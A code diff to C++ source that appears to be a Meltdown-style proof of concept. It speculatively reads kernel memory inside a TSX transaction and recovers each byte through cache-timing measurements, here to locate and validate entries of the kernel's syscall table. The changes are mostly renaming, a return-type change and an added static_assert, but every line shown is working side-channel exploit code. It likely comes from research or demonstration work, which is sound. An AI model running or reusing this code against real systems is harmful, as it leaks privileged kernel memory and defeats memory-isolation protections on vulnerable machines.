@@ -69,17 +69,17 @@ static inline unsigned mem_size() {
 }
 
 //
-// Retrieves one byte from syscall table at address ptr.
+// Retrieves one byte from syscall table at address target_address.
 //
-static unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
+static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, char* pages) {
     std::array<unsigned long, total_pages> durations;
-    int min_duration = 0;
+    uint8_t index = 0;
 
     for (auto c = 0; c < syscall_table_entry_read_retries; c++) {
         durations = { 0 };
 
         for (auto i = 0; i < total_pages; i++) {
-            __clflush(&buf[i * page_size()]);
+            __clflush(&pages[i * page_size()]);
         }
 
         // Speculatively read byte from kernel address and execute a dependent instruction on
@@ -87,19 +87,20 @@ static unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* b
         // Subsequently, we measure access time for i={0..255} buf[i * 4096], and we assume
         // the one with fastest access is the byte read from the address in the kernel.
         if (_xbegin() == _XBEGIN_STARTED) {
-            __speculative_byte_load(ptr, buf);
+            __speculative_byte_load(target_address, pages);
             _xend();
         } else {
             // nothing
         }
 
+        static_assert(total_pages <= std::numeric_limits<uint8_t>::max()+1);
         for (auto i = 0; i < total_pages; i++) {
-            durations[i] = __measure_load_execution(&buf[i * page_size()]);
+            durations[i] = __measure_load_execution(&pages[i * page_size()]);
 
-            min_duration = (durations[min_duration] <= durations[i]) ? min_duration : i;
+            index = (durations[index] <= durations[i]) ? index : i;
         }
     }
-    return (unsigned char)(min_duration);
+    return index;
 }
 
 //
@@ -126,12 +127,12 @@ static bool validate_syscall_table_entry(const void* data, const std::unordered_
 //
 // Checks if syscall table address actually stores a valid system call by consulting the symbol map.
 //
-static bool check_one_syscall_table_address(uintptr_t target_address, char* mem, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
+static bool check_one_syscall_table_address(uintptr_t target_address, char* pages, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
     size_t address_size = sizeof(uintptr_t);
     unsigned char buffer[address_size];
 
     for (auto i = 0; i < address_size; i++) {
-        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, mem);
+        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, pages);
     }
     return validate_syscall_table_entry(buffer, symbol_map);
 }
